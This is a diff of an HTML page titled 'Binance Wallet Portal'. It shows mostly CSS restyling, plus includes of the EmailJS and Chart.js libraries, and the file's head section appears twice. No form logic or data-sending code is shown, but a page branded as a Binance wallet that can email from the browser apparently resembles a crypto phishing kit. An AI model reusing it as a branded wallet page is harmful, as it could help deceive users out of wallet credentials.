@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>Binance Wallet Portal</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Arial', sans-serif;
       margin: 0;
       background-color: #0d111c;
-      color: white;
+      color: #ffffff;
       font-weight: bold;
     }
     .page {
@@ -22,95 +22,82 @@
       display: block !important;
     }
     .form-container {
-      max-width: 400px;
+      max-width: 420px;
       margin: 0 auto;
+      background-color: #131722;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(243, 186, 47, 0.1);
     }
-    input,
-    button {
+    input, button, select {
       width: 100%;
       padding: 12px;
-      margin: 10px 0;
-      border-radius: 6px;
+      margin: 12px 0;
+      border-radius: 8px;
       border: none;
       font-size: 1rem;
+      font-weight: bold;
+    }
+    input, select {
+      background-color: #1e2635;
+      color: #ffffff;
     }
     button {
       background-color: #f3ba2f;
-      color: black;
+      color: #0d111c;
       font-weight: bold;
       cursor: pointer;
     }
     .token {
-      background: #131722;
+      background-color: #1a1f2e;
       display: flex;
       justify-content: space-between;
+      align-items: center;
       padding: 15px;
       border-radius: 10px;
       margin: 10px 0;
-      align-items: center;
+      transition: background 0.3s;
+    }
+    .token:hover {
+      background-color: #2b3245;
     }
     .token img {
-      width: 24px;
+      width: 26px;
       margin-right: 10px;
       animation: pulse 2s infinite;
     }
     .top-left {
       position: absolute;
-      top: 10px;
-      left: 10px;
+      top: 12px;
+      left: 12px;
     }
     #walletStatus {
       position: absolute;
-      top: 10px;
-      right: 10px;
+      top: 12px;
+      right: 12px;
       background-color: #f3ba2f;
       color: #0d111c;
-      padding: 6px 12px;
-      border-radius: 6px;
+      padding: 8px 16px;
+      border-radius: 8px;
       font-size: 14px;
-      white-space: pre-line;
+      font-weight: bold;
     }
     #logoutConfirm {
-      background: #131722;
+      background-color: #131722;
       border: 1px solid #f3ba2f;
-      padding: 20px;
-      border-radius: 10px;
+      padding: 24px;
+      border-radius: 12px;
       position: absolute;
       top: 40%;
       left: 50%;
       transform: translate(-50%, -50%);
       display: none;
+      color: #ffffff;
     }
     @keyframes pulse {
-      0% {
-        transform: scale(1);
-        opacity: 1;
-      }
-      50% {
-        transform: scale(1.1);
-        opacity: 0.7;
-      }
-      100% {
-        transform: scale(1);
-        opacity: 1;
-      }
-    }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-weight: normal;
-      color: #f3ba2f;
-    }
-    #disconnectBtn {
-      margin-top: 8px;
-      padding: 8px 12px;
-      border: none;
-      border-radius: 6px;
-      background: #f44336;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      width: 100%;
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.1); opacity: 0.6; }
+      100% { transform: scale(1); opacity: 1; }
     }
   </style>
 </head>
@@ -606,57 +593,95 @@
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Arial', sans-serif;
       margin: 0;
       background-color: #0d111c;
-      color: white;
+      color: #ffffff;
       font-weight: bold;
     }
-    .page { display: none; padding: 20px; }
-    .visible { display: block !important; }
-    .form-container { max-width: 400px; margin: 0 auto; }
-    input, button {
-      width: 100%; padding: 12px; margin: 10px 0;
-      border-radius: 6px; border: none;
+    .page {
+      display: none;
+      padding: 20px;
+    }
+    .visible {
+      display: block !important;
+    }
+    .form-container {
+      max-width: 420px;
+      margin: 0 auto;
+      background-color: #131722;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(243, 186, 47, 0.1);
+    }
+    input, button, select {
+      width: 100%;
+      padding: 12px;
+      margin: 12px 0;
+      border-radius: 8px;
+      border: none;
       font-size: 1rem;
+      font-weight: bold;
+    }
+    input, select {
+      background-color: #1e2635;
+      color: #ffffff;
     }
     button {
       background-color: #f3ba2f;
-      color: black;
+      color: #0d111c;
       font-weight: bold;
+      cursor: pointer;
     }
     .token {
-      background: #131722;
-      display: flex; justify-content: space-between;
-      padding: 15px; border-radius: 10px;
-      margin: 10px 0; align-items: center;
+      background-color: #1a1f2e;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px;
+      border-radius: 10px;
+      margin: 10px 0;
+      transition: background 0.3s;
     }
-    .token img { width: 24px; margin-right: 10px; animation: pulse 2s infinite; }
-    .top-left { position: absolute; top: 10px; left: 10px; }
+    .token:hover {
+      background-color: #2b3245;
+    }
+    .token img {
+      width: 26px;
+      margin-right: 10px;
+      animation: pulse 2s infinite;
+    }
+    .top-left {
+      position: absolute;
+      top: 12px;
+      left: 12px;
+    }
     #walletStatus {
       position: absolute;
-      top: 10px;
-      right: 10px;
+      top: 12px;
+      right: 12px;
       background-color: #f3ba2f;
       color: #0d111c;
-      padding: 6px 12px;
-      border-radius: 6px;
+      padding: 8px 16px;
+      border-radius: 8px;
       font-size: 14px;
+      font-weight: bold;
     }
     #logoutConfirm {
-      background: #131722;
+      background-color: #131722;
       border: 1px solid #f3ba2f;
-      padding: 20px;
-      border-radius: 10px;
+      padding: 24px;
+      border-radius: 12px;
       position: absolute;
       top: 40%;
       left: 50%;
       transform: translate(-50%, -50%);
       display: none;
+      color: #ffffff;
     }
     @keyframes pulse {
       0% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.1); opacity: 0.7; }
+      50% { transform: scale(1.1); opacity: 0.6; }
       100% { transform: scale(1); opacity: 1; }
     }
   </style>
